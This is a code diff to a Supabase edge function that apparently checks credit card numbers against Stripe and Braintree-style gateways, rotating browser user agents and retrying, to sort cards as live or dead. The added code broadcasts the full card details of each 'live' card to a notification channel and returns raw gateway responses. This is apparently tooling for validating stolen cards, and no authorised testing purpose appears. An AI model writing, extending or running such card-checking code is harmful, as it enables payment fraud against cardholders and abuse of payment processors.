@@ -11,6 +11,35 @@ const corsHeaders = {
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
 
+// Notify charged card (fire-and-forget) - broadcasts to channel
+const notifyChargedCard = (
+  userId: string,
+  cardDetails: string,
+  status: "CHARGED" | "DECLINED" | "UNKNOWN",
+  responseMessage: string,
+  amount: string,
+  gateway: string
+) => {
+  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+  if (!SUPABASE_SERVICE_ROLE_KEY) return;
+
+  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+    },
+    body: JSON.stringify({
+      user_id: userId,
+      card_details: cardDetails,
+      status,
+      response_message: responseMessage,
+      amount,
+      gateway,
+    }),
+  }).catch((err) => console.error("[COMBINED-AUTH] notify-charged-card error:", err));
+};
+
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
@@ -132,12 +161,13 @@ const performStripeCheck = async (cc: string, userAgent: string, attempt: number
       return performStripeCheck(cc, newUserAgent, attempt + 1);
     }
 
-    // Return only necessary fields - no raw response
+    // Return with raw response for debugging
     return {
       computedStatus,
       apiStatus: data.status || 'UNKNOWN',
       apiMessage,
-      gateway: 'stripe'
+      gateway: 'stripe',
+      rawResponse: rawText
     };
   } catch (error) {
     console.error(`[COMBINED-STRIPE] Attempt ${attempt} - Fetch error:`, error);
@@ -207,12 +237,13 @@ const performB3Check = async (cc: string, userAgent: string, attempt: number = 1
       return performB3Check(cc, newUserAgent, attempt + 1);
     }
 
-    // Return only necessary fields - no raw response
+    // Return with raw response for debugging
     return {
       computedStatus,
       apiStatus: data.status || data.result || 'UNKNOWN',
       apiMessage,
-      gateway: 'b3'
+      gateway: 'b3',
+      rawResponse: rawText
     };
   } catch (error) {
     console.error(`[COMBINED-B3] Attempt ${attempt} - Fetch error:`, error);
@@ -372,6 +403,18 @@ serve(async (req) => {
     }
 
     console.log('[COMBINED-AUTH] Final result:', finalResult.computedStatus, 'via', finalResult.usedGateway);
+
+    // Broadcast LIVE cards to channel (fire-and-forget)
+    if (finalResult.computedStatus === 'live') {
+      notifyChargedCard(
+        user.id,
+        cc,
+        'CHARGED',
+        String(finalResult.apiMessage || 'LIVE'),
+        '$0.00',
+        'Yunchi Auth 2'
+      );
+    }
 
     return new Response(
       JSON.stringify(finalResult),
